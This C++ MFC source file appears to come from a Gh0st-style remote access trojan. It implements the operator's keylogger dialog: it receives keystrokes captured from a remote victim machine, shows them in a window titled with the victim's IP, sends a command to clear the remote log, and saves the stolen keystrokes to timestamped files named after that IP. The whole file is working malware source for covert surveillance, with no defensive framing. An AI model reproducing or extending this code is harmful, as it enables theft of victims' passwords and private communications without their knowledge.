// KeyBoardDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "KeyBoardDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define IDM_CLEAR_RECORD	0x0011
#define IDM_SAVE_RECORD		0x0012
/////////////////////////////////////////////////////////////////////////////
// CKeyBoardDlg dialog


CKeyBoardDlg::CKeyBoardDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CKeyBoardDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CKeyBoardDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
	
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_KEYBOARD));
	m_bIsOfflineRecord = (BYTE)m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1];
}


void CKeyBoardDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CKeyBoardDlg)
	DDX_Control(pDX, IDC_EDIT, m_edit);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CKeyBoardDlg, CDialog)
	//{{AFX_MSG_MAP(CKeyBoardDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_CLOSE()
	ON_WM_SIZE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CKeyBoardDlg message handlers

BOOL CKeyBoardDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		//pSysMenu->DeleteMenu(SC_TASKLIST, MF_BYCOMMAND);
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CLEAR_RECORD, "清空记录(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVE_RECORD, "保存记录(&S)");
	}


	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度
	ResizeEdit();
	UpdateTitle();

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CKeyBoardDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
   if (nID == IDM_CLEAR_RECORD)
	{
		BYTE bToken = COMMAND_KEYBOARD_CLEAR;
		m_iocpServer->Send(m_pContext, &bToken, 1);
		m_edit.SetWindowText("");
	}
	else 
	{
       	if (nID == IDM_SAVE_RECORD)
		{ 
			SaveRecord();
		}
		else
		{
			CDialog::OnSysCommand(nID, lParam);
		}
	}
}
void CKeyBoardDlg::OnReceiveComplete()
{	
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_KEYBOARD_DATA:
		AddKeyBoardData();
		break;
	default:
		// 传输发生异常数据
		SendException();
		break;
	}
}



void CKeyBoardDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}


void CKeyBoardDlg::OnClose()
{
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}

void CKeyBoardDlg::AddKeyBoardData()
{
	// 最后填上0
	m_edit.SetWindowText("");
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1));
}

void CKeyBoardDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	// TODO: Add your message handler code here
	ResizeEdit();
}

void CKeyBoardDlg::ResizeEdit()
{
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);
}

void CKeyBoardDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

bool CKeyBoardDlg::SaveRecord()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.txt");
	CFileDialog dlg(FALSE, "txt", strFileName, OFN_OVERWRITEPROMPT, "文本文档(*.txt)|*.txt|", this);
	if(dlg.DoModal () != IDOK)
		return false;
	
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox("文件保存失败");
		return false;
	}
	// Write the DIB header and the bits
	CString	strRecord;
	m_edit.GetWindowText(strRecord);
	file.Write(strRecord, strRecord.GetLength());
	file.Close();
	return true;
}

BOOL CKeyBoardDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}	
	return CDialog::PreTranslateMessage(pMsg);
}

void CKeyBoardDlg::UpdateTitle()
{
	CString str;
	str.Format("%s - 键盘记录", m_IPAddress);
	SetWindowText(str);	
}